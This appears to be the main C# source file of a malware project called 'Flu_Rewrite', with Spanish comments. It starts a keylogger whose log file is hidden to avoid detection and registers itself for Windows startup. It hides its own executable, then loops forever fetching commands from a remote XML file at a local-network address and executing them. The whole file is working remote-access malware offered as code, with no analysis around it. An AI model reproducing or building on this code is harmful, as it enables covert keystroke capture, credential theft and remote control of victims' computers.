using System;
using System.IO;
using System.Threading;

namespace Flu_Rewrite
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            String[] Procesos = ComandosInternos.ListadeProcesos();
#if !MONO
            //El archivo se crearia aleatoriamente para prevenir deteccion y ademas ayudar a la portabilidad
            String Ruta = Path.GetTempFileName();
            //Necesitamos esconder el archivo
            //TODO: Esto funciona en Mono? Si no, es facil de arreglar
            FileInfo FI = new FileInfo(Ruta);
            //Escondemos el archivo del keylogger
            FI.Attributes = FileAttributes.Hidden;
            Keylogger Kl = new Keylogger(Ruta);
            Kl.Enabled = true;
            //A que no se sabian esta XD
            Kl.FlushInterval = 1500d;
#endif
            //Si estamos en Windows....
            if (Environment.OSVersion.Platform == PlatformID.Win32NT) Infeccion.RegistroInicio();
            //De nuevo, no tiene mucho sentido si no estamos en Windows, pero...
            Infeccion.EsconderEjecutable();
            while (true)
            {
                if (LectorXML.CargarInstrucciones("http://192.168.1.33/wee.xml")) LectorXML.EjecutarComandos();
                Thread.Sleep(15000);
            }
        }
    }
}
